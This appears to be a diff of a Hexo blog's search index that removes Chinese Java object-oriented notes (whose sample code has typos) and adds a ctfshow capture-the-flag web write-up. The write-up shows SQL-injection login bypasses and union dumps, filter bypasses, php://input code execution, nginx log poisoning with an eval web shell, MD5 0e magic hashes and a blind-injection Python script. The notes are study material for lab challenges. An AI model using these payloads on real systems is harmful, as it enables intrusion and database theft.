   <entry>
-    <title>Java面向对象</title>
-    <url>/2023/07/27/Java3/</url>
-    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
-
-<h1 id="Java-对象和类"><a href="#Java-对象和类" class="headerlink" title="Java 对象和类"></a>Java 对象和类</h1><ul>
-<li><p><strong>类和对象的关系</strong><br><strong>类</strong>:类是对现实生活中一类具有共同属性和行为的事物的抽象<br><strong>对象</strong>:是能够看得到摸的着的真实存在的实体</p>
-</li>
-<li><p><strong>类的定义</strong><br><strong>类的重要性</strong>:是Java程序的基本组成单位<br><strong>类是什么</strong>:是对现实生活中一类具有共同属性和行为的事物的抽象，确定对象将会拥有的属性和行为</p>
-<p><strong>类的特点</strong>：类是对象的数据类型，是具有相同属性和行为的事物的抽象</p>
-<p><strong>类的组成</strong>:属性和行为<br><strong>属性</strong>:在类中通过成员变量来体现(类中方法外的变量)<br><strong>行为</strong>:在类中通过成员方法来体现(和前面的方法相比去掉static关键字即可)</p>
-</li>
-<li><p><strong>对象的定义</strong></p>
-<p>看看周围真实的世界，会发现身边有很多对象，车，手机，人等等。所有这些对象都有自己的属性和行为。</p>
-</li>
-</ul>
-<p>​       拿一个手机来举例，它的属性有：品牌、价格，行为有：打电话、发短信。</p>
-<p>​       软件对象也有属性和行为。行为通过方法体现。</p>
-<p>​       在软件开发中，方法操作对象内部状态的改变，对象的相互调用也是通过方法来完成。</p>
-<h2 id="Java-中的类"><a href="#Java-中的类" class="headerlink" title="Java 中的类"></a>Java 中的类</h2><p>类可以看成是创建 Java 对象的模板。</p>
-<p>pubIic class Phone {</p>
-<p>​		&#x2F;&#x2F;成员变量</p>
-<p>​		String brand;</p>
-<p>​		int price;</p>
-<p>​		&#x2F;&#x2F;成员方法</p>
-<p>​		public void call(){</p>
-<p>​			System.out.printIn(“打电话”);}<br>​		public void sendMessage(){</p>
-<p>​			System.out,pnintIn(“发短信”);}</p>
-<p>}</p>
-<p><strong>成员变量和局部变量的区别</strong></p>
-<table>
-<thead>
-<tr>
-<th align="center">区别</th>
-<th align="center">成员变量</th>
-<th align="center">局部变量</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">类中位置不同</td>
-<td align="center">类中方法外</td>
-<td align="center">方法内或者方法声明上</td>
-</tr>
-<tr>
-<td align="center">内存中位置不同</td>
-<td align="center">堆内存</td>
-<td align="center">栈内存</td>
-</tr>
-<tr>
-<td align="center">生命周期不同</td>
-<td align="center">随着对象的存在而存在，随看对象的消失而消失</td>
-<td align="center">随着方法的调用而存在，随着方法的调用完毕而消失</td>
-</tr>
-<tr>
-<td align="center">初始化值不同</td>
-<td align="center">有默认的初始化值</td>
-<td align="center">没有默认的初始化值，必须先定义，赋值，才能使用</td>
-</tr>
-</tbody></table>
-<ul>
-<li><strong>局部变量</strong>：在方法、构造方法或者语句块中定义的变量被称为局部变量。变量声明和初始化都是在方法中，方法结束后，变量就会自动销毁。</li>
-<li><strong>成员变量</strong>：成员变量是定义在类中，方法体之外的变量。这种变量在创建对象的时候实例化。成员变量可以被类中方法、构造方法和特定类的语句块访问。</li>
-<li><strong>类变量</strong>：类变量也声明在类中，方法体之外，但必须声明为 static 类型。</li>
-</ul>
-<hr>
-<h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><p>格式:类名对象名 &#x3D; new 类名0;<br>范例: Phone p &#x3D; new Phone0;</p>
-<h2 id="使用对象"><a href="#使用对象" class="headerlink" title="使用对象"></a>使用对象</h2><ol>
-<li><strong>使用成员变量</strong><br>格式:对象名.变量名<br>范例:p.brand</li>
-<li><strong>使用成员方法</strong><br>格式:对象名.方法名()<br>范例: p.call()</li>
-</ol>
-<hr>
-<h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><h2 id="一、private关键字"><a href="#一、private关键字" class="headerlink" title="一、private关键字"></a>一、private关键字</h2><ul>
-<li>是一个权限修饰符</li>
-<li>可以修饰成员 (成员变量和成员方法)</li>
-<li>作用是保护成员不被别的类使用，被private修饰的成员只在本类中才能访问</li>
-</ul>
-<p>针对<code>private</code>修饰的成员变量，如果需要被其他类使用，提供相应的操作</p>
-<ul>
-<li>提供“<code>get变量名()</code>”方法，用于获取成员变量的值，方法用<code>public</code>修饰</li>
-<li>提供“<code>set变量名(参数)</code>”方法，用于设置成员变量的值，方法用<code>public</code>修饰</li>
-</ul>
-<h2 id="二、this关键字"><a href="#二、this关键字" class="headerlink" title="二、this关键字"></a>二、this关键字</h2><ol>
-<li><p>this修饰的变量用于指代成员变量<br>方法的形参如果与成员变量同名，不带this修饰的变量指的是形参，而不是成员变量<br>方法的形参没有与成员变量同名，不带this修饰的变量指的是成员变量</p>
-</li>
-<li><p>什么时候使用this呢? <strong>解决局部变量隐藏成员变量</strong></p>
-</li>
-<li><p>this 代表所在类的对象引用<br>记住:方法被哪个对象调用，this就代表哪个对象</p>
-</li>
-</ol>
-<h2 id="三、封装"><a href="#三、封装" class="headerlink" title="三、封装"></a>三、封装</h2><ol>
-<li><strong>封装概述</strong><br>是面向对象三大特征之一 (封装，继承，多态)<br>是面向对象编程语言对客观世界的横拟，客观世界里成员变量都是隐藏在对象内部的，外界是无法直接操作</li>
-<li><strong>封装规则</strong><br>将类的某些信息隐藏在类内部，不允许外部程序直接访问，而是通过该类提供的方法来实现对的冠信息的操作和访问成员变量private，提供对应的getXxx()&#x2F;setXxx()方法</li>
-<li><strong>好处</strong><br>通过方法来控制成员变量的操作，提高了代码的安全性<br>把代码用方法进行封装，提高了代码的复用性</li>
-</ol>
-<h2 id="四、构造方法"><a href="#四、构造方法" class="headerlink" title="四、构造方法"></a>四、构造方法</h2><p>在创建一个对象的时候，至少要调用一个构造方法。构造方法的名称必须与类同名，一个类可以有多个构造方法。</p>
-<p>下面是一个构造方法示例：</p>
-<p>public class Student{   </p>
-<p>​		 public Student(){ }     </p>
-<p>​		 public Student(String name){         </p>
-<p>​			&#x2F;&#x2F; 这个构造器仅有一个参数：name    } }</p>
-<p><strong>注意事项</strong>：</p>
-<ol>
-<li><p>构造方法的创建</p>
-<p>如果没有定义构造方法，系统将给出一个认的无参数构造方法<br>如果定义了构造方法，系统将不再提供默认的构造方法</p>
-</li>
-<li><p>构造方法的重载<br>如果自定义了带参构造方法，还要使用无参数构造方法，就必须再写一个无参数构造方法</p>
-</li>
-<li><p>推荐的使用方式<br>无论是否使用，都手工书写无参数构造方法</p>
-</li>
-</ol>
-<h5 id="标准类制作"><a href="#标准类制作" class="headerlink" title="标准类制作"></a>标准类制作</h5><ol>
-<li>成员变量<br>使用private修饰</li>
-<li>构造方法<br>提供一个无参构造方法<br>提供一个带多个参数的构造方法</li>
-<li>成员方法<br>提供每一个成员变量对应的setXxx()&#x2F;getXxx()<br>提供一个显示对象信息的show()</li>
-<li>创建对象并为其成员变量值的两种方式<br>无参构造方法创建对象后使用setXxx()赋值<br>使用带参构造方法直接创建带有属性值的对象</li>
-</ol>
-<p>例子：</p>
-<h5 id="Student-java程序"><a href="#Student-java程序" class="headerlink" title="Student.java程序"></a>Student.java程序</h5><p>public class Student{   </p>
-<p>​		prative String name;&#x2F;&#x2F;成员变量</p>
-<p>​		prative int age;</p>
-<p>​		public Student() { }&#x2F;&#x2F;构造方法</p>
-<p>​		public Student(String name,int age){ </p>
-<p>​			this.name &#x3D; name;</p>
-<p>​			this.age &#x3D; age;}</p>
-<p>​		&#x2F;&#x2F;成员方法</p>
-<p>​		public void setName(String name){</p>
-<p>​			this.name &#x3D; name;}</p>
-<p>​		public String getName(){</p>
-<p>​			return name;}</p>
-<p>​		public void setAge(int age){</p>
-<p>​			this.age &#x3D; age;}</p>
-<p>​		public String getAge(){</p>
-<p>​			return age;}</p>
-<p>​		public void show(){</p>
-<p>​			System.out.println(name+”,”+age);}</p>
-<p>} </p>
-<h5 id="StudentDemo-java程序"><a href="#StudentDemo-java程序" class="headerlink" title="StudentDemo.java程序"></a>StudentDemo.java程序</h5><p>package com.XXX</p>
-<p>public class StudentDemo{</p>
-<p>​		public static void main(String[ ] args){</p>
-<p>​			&#x2F;&#x2F;无参构造方法创建对象后使用setXxx()赋值</p>
-<p>​			Student s1 &#x3D; new Student( );</p>
-<p>​			s1.setName(“xuan”);</p>
-<p>​			s1.setAge(18);</p>
-<p>​			s1.show();</p>
-<p>​			&#x2F;&#x2F;使用带参构造方法直接创建带有属性值的对象</p>
-<p>​			Student s2 &#x3D; new Student(“name:”xuan”,age:18);</p>
-<p>​			s2.show();</p>
-<p>​		}		</p>
-<p>}</p>
-<p><strong>运行结果</strong>：</p>
-<p>xuan,18</p>
-<p>xuan,18</p>
-<h1 id="Java-继承"><a href="#Java-继承" class="headerlink" title="Java 继承"></a>Java 继承</h1><hr>
-<h2 id="继承的概念"><a href="#继承的概念" class="headerlink" title="继承的概念"></a>继承的概念</h2><p>继承是面向对象的三大特征之一，可以使得子类具有父类的属性和方法，还可以在子类中重新定义，追加属性和方法</p>
-<ul>
-<li>格式:public class 子类名extends父类名}</li>
-<li>范例: public class Zi extends Fu<br>Fu:是类，也被称为基类、超类<br>Zi: 是子类，也被称为派生类</li>
-</ul>
-<p>继承中子类的特点：</p>
-<p>子类可以有父类的内容，还可以有自己特有的内容</p>
-<h2 id="继承的好处和弊端"><a href="#继承的好处和弊端" class="headerlink" title="继承的好处和弊端"></a>继承的好处和弊端</h2><p><strong>继承好处</strong><br>提高了代码的复用性(多个类相同的成员可以放到同一个类中)<br>提高了代码的维护性(如果方法的代码需要修改，修改一处即可)<br><strong>继承弊端</strong><br>继承让类与类之间产生了关系，类的合性增强了，当父类发生变化时子类实现也不得不跟着变化，削弱了子类的独立性<br><strong>什么时候使用继承?</strong><br>继承体现的关系:is a<br>假设法:我有两个类A和B，如果他们满足A是B的一种，或者B是A的一种，就说明他们存在继承关系，这个时候就可以考虑使用继承来体现，否则就不滥用继承</p>
-<h2 id="继承中变量的访问特点"><a href="#继承中变量的访问特点" class="headerlink" title="继承中变量的访问特点"></a>继承中变量的访问特点</h2><p>在子类方法中访问一个变量</p>
-<ol>
-<li>子类局部范围找</li>
-<li>子类成员范围找</li>
-<li>父类成员范围找</li>
-<li>如果都没有就报错(不考虑父亲的父亲…)</li>
-</ol>
-<h2 id="继承类型"><a href="#继承类型" class="headerlink" title="继承类型"></a>继承类型</h2><p>需要注意的是 Java 不支持多继承，但支持多重继承。</p>
-<p><img src="https://www.runoob.com/wp-content/uploads/2013/12/java-extends-2020-12-08.png" alt="img"></p>
-<h2 id="继承关键字"><a href="#继承关键字" class="headerlink" title="继承关键字"></a>继承关键字</h2><p>继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 java.lang.Object，当一个类没有继承的两个关键字，则默认继承 Object（这个类在 <strong>java.lang</strong> 包中，所以不需要 <strong>import</strong>）祖先类。</p>
-<h3 id="extends关键字"><a href="#extends关键字" class="headerlink" title="extends关键字"></a>extends关键字</h3><p>在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。</p>
-<p>public class Animal {<br>    private String name;<br>    private int id;<br>    public Animal(String myName, int myid) {<br>        &#x2F;&#x2F;初始化属性值<br>    }<br>    public void eat() {  &#x2F;&#x2F;吃东西方法的具体实现  }<br>    public void sleep() { &#x2F;&#x2F;睡觉方法的具体实现  }<br>} </p>
-<p>public class Penguin  extends  Animal{<br>}</p>
-<h3 id="implements关键字"><a href="#implements关键字" class="headerlink" title="implements关键字"></a>implements关键字</h3><p>使用 implements 关键字可以变相的使java具有<code>多继承</code>的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。</p>
-<p>public interface A {<br>    public void eat();<br>    public void sleep();<br>}</p>
-<p>public interface B {<br>    public void show();<br>}</p>
-<p>public class C implements A,B {<br>}</p>
-<h3 id="super-与-this-关键字"><a href="#super-与-this-关键字" class="headerlink" title="super 与 this 关键字"></a>super 与 this 关键字</h3><p>super关键字：我们可以通过super关键字来实现对父类成员的访问，用来引用当前对象的父类。</p>
-<p>this关键字：指向自己的引用。</p>
-<p><strong>实例</strong></p>
-<p>class Animal {<br>  void eat() {<br>    System.out.println(“animal : eat”);<br>  }<br>}</p>
-<p>class Dog extends Animal {<br>  void eat() {<br>    System.out.println(“dog : eat”);<br>  }<br>  void eatTest() {<br>    this.eat();   &#x2F;&#x2F; this 调用自己的方法<br>    super.eat();  &#x2F;&#x2F; super 调用父类方法<br>  }<br>}</p>
-<p>public class Test {<br>  public static void main(String[] args) {<br>    Animal a &#x3D; new Animal();<br>    a.eat();<br>    Dog d &#x3D; new Dog();<br>    d.eatTest();<br>  }<br>}</p>
-<p>输出结果为：</p>
-<p>animal : eat<br>dog : eat<br>animal : eat</p>
-<h3 id="final-关键字"><a href="#final-关键字" class="headerlink" title="final 关键字"></a>final 关键字</h3><p>final 可以用来修饰变量（包括类属性、对象属性、局部变量和形参）、方法（包括类方法和对象方法）和类。</p>
-<p><strong>final修饰的特点</strong></p>
-<ul>
-<li>修饰方法:表明该方法是最终方法，不能被重写</li>
-<li>修饰变量:表明该变量是常量，不能再次被赋值</li>
-<li>修饰类:表明该类是最终类，不能被继承</li>
-</ul>
-<p>声明类：</p>
-<p>final class 类名 {&#x2F;&#x2F;类体}</p>
-<p>声明方法：</p>
-<p>修饰符(public&#x2F;private&#x2F;default&#x2F;protected) final 返回值类型 方法名(){&#x2F;&#x2F;方法体}</p>
-<p><strong>注：</strong> final 定义的类，其中的属性、方法不是 final 的。</p>
-<p><strong>final修饰局部变量</strong></p>
-<p>变量是基本类型: final修饰指的是基本类型的数据值不能发生改变</p>
-<p>变量是引用类型: final修饰指的是引用类型的地址值不能发生改变，但是地址里面的内容是可以发生改变的</p>
-<h1 id="static-关键字"><a href="#static-关键字" class="headerlink" title="static 关键字"></a>static 关键字</h1><p>static 关键字是静态的意思，可以修饰成员方法，成员变量<br><strong>static 修饰的特点</strong></p>
-<ul>
-<li>被类的所有对象共享<br>这也是我们判断是否使用静态关键字的条件</li>
-<li>推荐使用类名调用</li>
-</ul>
-<p><strong>static 访问特点</strong></p>
-<p>静态成员方法只能访问静态成员和静态成员方法</p>
-<h1 id="Java-包"><a href="#Java-包" class="headerlink" title="Java 包"></a>Java 包</h1><p>包主要用来对类和接口进行分类管理</p>
-<p>包的定义格式</p>
-<p>格式：package 包名；</p>
-<p>范例：package com.first;</p>
-<h2 id="import-语句-导包"><a href="#import-语句-导包" class="headerlink" title="import 语句(导包)"></a>import 语句(导包)</h2><p>在 Java 中，如果给出一个完整的限定名，包括包名、类名，那么 Java 编译器就可以很容易地定位到源代码或者类。import 语句就是用来提供一个合理的路径，使得编译器可以找到某个类。</p>
-<p>例如，下面的命令行将会命令编译器载入 java_installation&#x2F;java&#x2F;io 路径下的所有类</p>
-<p>import java.io.*;(import 包名)</p>
-]]></content>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux</title>
     <url>/2023/08/09/Linux/</url>
     <content><![CDATA[<h1 id="Linux操作系统获取方式"><a href="#Linux操作系统获取方式" class="headerlink" title="Linux操作系统获取方式"></a>Linux操作系统获取方式</h1><span id="more"></span>
@@ -3256,6 +3338,298 @@ chmod(&quot;/somedir/somefile&quot;, 0755);
 ]]></content>
       <tags>
         <tag>语言</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow</title>
+    <url>/2023/08/17/ctfshow/</url>
+    <content><![CDATA[<p>ctfshow</p>
+<span id="more"></span>
+
+<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>查看源码，base64解码得flag</p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>构造SQL注入语句，这是一个登录功能，那应该考虑是字符串注入，在username后面加上<code> &#39; or 1=1  #</code>发送</p>
+<p>成功登录。证明构造的语句没有问题，接下来就是一把梭，猜解字段数、获取数据库名、获取表名、获取字段、拿到flag！</p>
+<p><code>&#39;username=ctfshow&#39; order by 3  #&amp;password=123</code>显示登录成功，</p>
+<p><code>&#39;username=ctfshow&#39; order by 4  #</code>不显示，证明有三个字段。</p>
+<p><code>username=ctfshow&#39; union select 1,2,3  #&amp;password=123</code>确定回显位置，看到2显示在了页面上，利用2这个位置继续搞。</p>
+<p><code>username=ctfshow&#39; union select 1,database(),3  #&amp;password=123</code>获取到数据库名</p>
+<p><code>username=ctfshow&#39; union select 1,group_concat(table_name),3  from information_schema.tables where table_schema=&#39;web2&#39;   #&amp;password=123</code> 获取数据库的表名，找到flag表啦</p>
+<p><code>username=ctfshow&#39; union select 1,group_concat(column_name),3  from information_schema.columns where table_name=&#39;flag&#39;   #&amp;password=123</code>获取flag表中的字段名</p>
+<p><code>username=ctfshow&#39; union select 1,group_concat(flag),3 from flag  #&amp;password=123</code>获取flag！</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>php伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf.show_web3</span><br><span class="line">&lt;?php include($_GET[&#x27;url&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 页面中显示了部分源码,明显是引导我们利用文件包含漏洞进行操作,源码中的include()函数通过GET请求接收一个url参数,那接下来我们就给它传递一个url参数</p>
+<p>使用Burp Suite抓包,利用php:&#x2F;&#x2F;input伪协议执行PHP代码,代码的内容为执行系统命令,查看当前目录下所有文件</p>
+<pre><code>?url=php://input        -- GET请求的url中拼接伪协议
+&lt;?php system(&#39;ls&#39;)?&gt;    -- post请求内容构造需要执行的代码
+</code></pre>
+<p>得到crf_go_go_go index.php，该文件就是存放flag的文件</p>
+<p>我们直接在url地址栏中拼接url参数,访问crf_go_go_go文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=ctf_go_go_go</span><br></pre></td></tr></table></figure>
+
+<p>成功获取flag</p>
+<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>日志注入</p>
+<p> ($_GET[‘url’])可看出存在文件包含漏洞</p>
+<p>F12打开网络栏，可以看到Server里面是nginx，尝试一下日志注入</p>
+<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230817104534044.png" alt="image-20230817104534044"></p>
+<p> nginx服务器默认日志位置在</p>
+<p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>在url后面输入查看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p> 发现可以</p>
+<p>用Burp Suite抓包，在User-Agent后面写个🐎</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;a&#x27;])?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 放包，注意看日志下面这时多出来一条</p>
+<p>此时木马已经插入进去了，日志中的代码会被执行但不会显示</p>
+<p>连接蚁剑</p>
+<p>注意URL地址写的是日志地址，因为我们的🐎是传进日志里了</p>
+<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230817105306721.png" alt="image-20230817105306721"></p>
+<p>在上层可以看到flag.txt</p>
+<p> <img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230817105325864.png" alt="image-20230817105325864"></p>
+<p> 拿到flag</p>
+<p>ctfshow{05eeaf03-2f53-4cc6-959c-f65fb4a7163a}</p>
+<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>考点：php代码审计</p>
+<pre><code> &lt;?php
+        $flag=&quot;&quot;;
+        $v1=$_GET[&#39;v1&#39;];
+        $v2=$_GET[&#39;v2&#39;];
+        if(isset($v1) &amp;&amp; isset($v2))&#123;
+            if(!ctype_alpha($v1))&#123;
+                die(&quot;v1 error&quot;);
+            &#125;
+            if(!is_numeric($v2))&#123;
+                die(&quot;v2 error&quot;);
+            &#125;
+            if(md5($v1)==md5($v2))&#123;
+                echo $flag;
+            &#125;
+        &#125;else&#123;
+        
+            echo &quot;where is flag?&quot;;
+        &#125;
+    ?&gt;  echo &quot;where is flag?&quot;;
+    &#125;
+?&gt;
+</code></pre>
+<ul>
+<li>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false</li>
+<li>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false</li>
+</ul>
+<p>这里我们可以使用MD5的0e绕过方式,输入一下payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=240610708</span><br></pre></td></tr></table></figure>
+
+<p>QNKCDZO 的md5值为 0e830400451993494058024219903391</p>
+<p>240610708 的md5值为 0e462097431906509019562988736854</p>
+<p>分别满足纯字母和数字字符串,并且md5值以0e开头,而0e开头的字符串参与比较(&#x3D;&#x3D;)时,会转化为0,也就是 0&#x3D;&#x3D;0,返回true使if判断成立,从而输出flag</p>
+<p>常用的值：</p>
+<pre><code>开头为0E（MD5值） 字母数字混合类型：
+s878926199a
+0e545993274517709034328855841020
+s155964671a
+0e342768416822451524974117254469
+s214587387a
+0e848240448830537924465865611904
+s214587387a
+0e848240448830537924465865611904
+纯大写字母：
+QLTHNDT
+0e405967825401955372549139051580
+QNKCDZO
+0e830400451993494058024219903391
+EEIZDOI
+0e782601363539291779881938479162
+纯数字：
+240610708
+0e462097431906509019562988736854
+4011627063
+0e485805687034439905938362701775
+4775635065
+0e998212089946640967599450361168
+4790555361
+0e643442214660994430134492464512
+5432453531
+0e512318699085881630861890526097
+5579679820
+0e877622011730221803461740184915
+5585393579
+0e664357355382305805992765337023
+6376552501
+0e165886706997482187870215578015
+7124129977
+0e500007361044747804682122060876
+7197546197
+0e915188576072469101457315675502
+7656486157
+0e451569119711843337267091732412
+</code></pre>
+<p>任意使用2个即可</p>
+<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p>web2的升级版，做了过滤</p>
+<p>一打开页面是用户名密码登录，我们首先第一个想到的就是sql注入了，来用万能钥匙1’ or 1&#x3D;1#试一下，报错了<br>然后，我在密码框里同样注入万能钥匙试了一下，发现，密码框中输入空格也会多一个黑点，于是我猜测可能是把空格过滤了，为了验证 我的猜想，来抓包看一下服务器收到的页面请求包最后传递的用户名和密码的参数值是什么样子的</p>
+<p>抓包果然发现，空格被过滤了</p>
+<p>一般空格被过滤有如下替换方法</p>
+<pre><code>/**/
+()
+回车(url编码中的%0a)
+`(tap键上面的按钮)
+tap
+两个空格
+</code></pre>
+<p>我们就选用&#x2F;**&#x2F;来替换空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/or/**/1=1#</span><br></pre></td></tr></table></figure>
+
+<p>好，登陆成功了</p>
+<p>接下来，来老生常谈的爆库爆表爆字段吧<br><strong>爆库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;/**/union/**/select/**/1,database(),3#&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p>得到数据库名为web2<br><strong>爆表</strong></p>
+<pre><code>username=1&#39;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#&amp;password=1
+</code></pre>
+<p>表有flag和user<br><strong>爆字段</strong></p>
+<pre><code>username=1&#39;/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name=&#39;flag&#39;#&amp;password=1
+</code></pre>
+<p>列名也为flag<br><strong>爆字段值</strong></p>
+<pre><code>username=1&#39;/**/union/**/select/**/1,flag,3/**/from/**/flag#&amp;password=1
+</code></pre>
+<p>拿到flag</p>
+<h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p>与we6相同<br>考点：sql注入 注入点的寻找<br>页面中有一个文章列表,随便点一个</p>
+<p> 从url地址栏中可以看到,页面通过文章的id值来查询文章内容,我们可以考虑SQL注入漏洞</p>
+<p>测试发现存在空格过滤，用&#x2F;**&#x2F;绕过</p>
+<p>首先判断注入点,输入以下payload,使SQL恒成立</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1/**/and/**/1</span><br></pre></td></tr></table></figure>
+
+<p>可以看到,页面正常显示</p>
+<p> 在输入以下payload,使SQL恒不成立</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1/**/and/**/0</span><br></pre></td></tr></table></figure>
+
+<p>可以看到,页面空显示</p>
+<p> 由此可以判断页面存在SQL注入,注入点为<strong>数值型注入</strong>,页面中有显示位,可以尝试<strong>联合注入</strong>进行脱库</p>
+<p>1.判断显示位,此处id传一个-1,由于id通常不为负数,后端根据id查询不到内容,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,2,3</span><br></pre></td></tr></table></figure>
+
+<p>2.判断当前使用的数据库,盲猜flag就藏在当前使用的数据库中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,database(),3</span><br></pre></td></tr></table></figure>
+
+<p>当前使用的数据库是web7</p>
+<p>3.获取当前数据库中的所有表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3</span><br></pre></td></tr></table></figure>
+
+<p>有一个flag表,那flag肯定就藏在这个表里面</p>
+<p>4.获取flag表中的所有字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,(select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema=&quot;web7&quot;/**/and/**/table_name=&quot;flag&quot;),3</span><br></pre></td></tr></table></figure>
+
+<p>flag表中只有一个flag字段</p>
+<p>5.查询flag表的flag字段,获取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3</span><br></pre></td></tr></table></figure>
+
+<p>成功获取flag</p>
+<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p>提示是sql注入，第一步先试下 ’ or 1&#x3D;1# 提示sql注入错误</p>
+<p>第二步试下&#x2F;**&#x2F;替代空格，还是错误</p>
+<p>第三步，去掉’单引号，成功，说明过滤了单引号<br> 测试：<code>?id=1/**/or/**/1=1#</code></p>
+<p>回显全部</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">-<span class="number">1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>无回显</p>
+<p>考虑盲注</p>
+<p>查看有多少字段<code>1/**/or/**/1=1/**/union/**/select/**/1,2,3#</code>，但是这里又提示sql错误，这里可能过滤了select和union关键字</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤空格：可以使用/**/和%a0绕过</span><br><span class="line">过滤联合查询语句：可以使用盲注替代联合注入</span><br><span class="line">过滤逗号,：可以使用特殊语法绕过, 比如:substr(database(),1,1) 可以用 substr(database() from 1 for 1)来代替</span><br><span class="line">过滤and：可以使用or</span><br><span class="line">过滤单引号：表名可以用十六进制来表示</span><br></pre></td></tr></table></figure>
+
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=&#x27;http://1a52462e-b3aa-4f50-8445-0792a199259e.chall.ctf.show/index.php&#x27;</span><br><span class="line">table=&quot;&quot;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&#x27; and ascii(substr((select database()),1,1))=xx #</span><br><span class="line">这样的话写个脚本很容易跑出来了，过滤逗号之后可以变成这样</span><br><span class="line"></span><br><span class="line">&#x27; and ascii(substr((select database())from 1 for 1))=xx #</span><br><span class="line">这应该是substring函数的两种用法</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1,45):</span><br><span class="line">    print(i)</span><br><span class="line">    for j in range(31,128):</span><br><span class="line">        #爆表名  flag</span><br><span class="line">        #payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br><span class="line">        #爆字段名 flag</span><br><span class="line">        #payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br><span class="line">        #读取flag</span><br><span class="line">        payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i), str(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + &#x27;?id=0/**/or/**/&#x27; + payload).text</span><br><span class="line"></span><br><span class="line">        if &#x27;I asked nothing&#x27; in ra:</span><br><span class="line">            table += chr(j)</span><br><span class="line">            print(table)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p> 进去以后就是一个登录界面, 盲猜是个SQL注入漏洞,行不通<br> 就觉得该换个思路</p>
+<p>那就扫描下目录吧,dirsearch扫出了一个robots.txt</p>
+<p>我们访问根目录下的 robots.txt 文件</p>
+<pre><code>robots.txt是一个文本文件,同时也是一个协议,规定了爬虫访问的规则( 哪些文件可以爬取,哪些文件不可以爬取)
+</code></pre>
